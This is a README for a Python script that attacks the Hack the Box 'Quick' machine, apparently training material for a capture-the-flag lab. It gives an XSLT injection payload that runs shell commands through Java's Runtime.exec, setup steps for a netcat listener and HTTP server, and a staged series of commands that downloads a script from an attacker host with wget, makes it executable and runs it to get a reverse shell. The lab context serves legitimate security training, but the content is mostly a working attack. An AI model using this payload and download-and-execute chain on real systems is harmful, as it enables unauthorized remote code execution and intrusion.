# QuickShell
Python script demonstrating the attack used for the Quick machine from Hack the Box

> You will need to first obtain the correct email address and password in order to successfully use this script

### Setup
1. Obtain the correct email address and password
2. Create 3 files in the same directory as QuickShell.py named stage1,2,3.xsl. These files will contain a series of bash commands.
3. Run a netcat listener on a port of your choice and have that up and running.
4. Run a python http server in the same folder as the xsl files.
5. Run QuickShell.py and wait for callback to the stage xsl files which will return a reverse shell.

### Example xsl file
```xml
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
<xsl:variable name="cmd"><![CDATA[PUT YOUR COMMANDS HERE]]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>

```

### Working Series of Commands
STAGE 1: `wget http://ip:port/rce.sh -O /tmp/rce.sh`

STAGE 2: `chmod +x /tmp/rce.sh`

STAGE 3: `/tmp/rce.sh`
